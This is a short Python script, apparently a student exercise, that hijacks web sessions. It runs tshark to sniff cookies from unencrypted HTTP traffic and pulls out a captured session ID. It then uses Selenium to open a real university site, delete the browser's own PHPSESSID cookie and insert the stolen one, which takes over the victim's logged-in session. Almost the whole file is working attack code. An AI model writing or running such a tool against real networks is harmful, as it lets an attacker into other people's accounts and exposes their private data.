import subprocess
import session_id_parser
from selenium import webdriver


def eat_cookie():
    command = ['tshark', '-l', '-Y', 'http.request', '-T', 'fields', '-e', 'http.cookie']

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pattern = {'name': '', 'value': ''}

    while True:
        output = process.stdout.readline().decode('utf-8')

        if output == '' and process.poll() is not None:
            break

        if output:
            cookie = session_id_parser.parse(output)

            for key, value in cookie.items():
                pattern['name'] = key
                pattern['value'] = value
            if pattern['name'] != '' and pattern['value'] != '':
                print('Captured session ID: ', pattern['value'])
                break

    driver = webdriver.Safari(keep_alive=True)
    driver.get('http://wppt.pwr.edu.pl')
    print('Eating cookie with original session ID...')
    print(driver.get_cookie('PHPSESSID'))
    print('**OMM OMM OMM**')
    driver.delete_cookie('PHPSESSID')
    print('Replacing with captured session ID\n')
    driver.add_cookie(pattern)
    driver.refresh()

    print('New cookies: ')
    for cookie in driver.get_cookies():
        print(cookie)


eat_cookie()
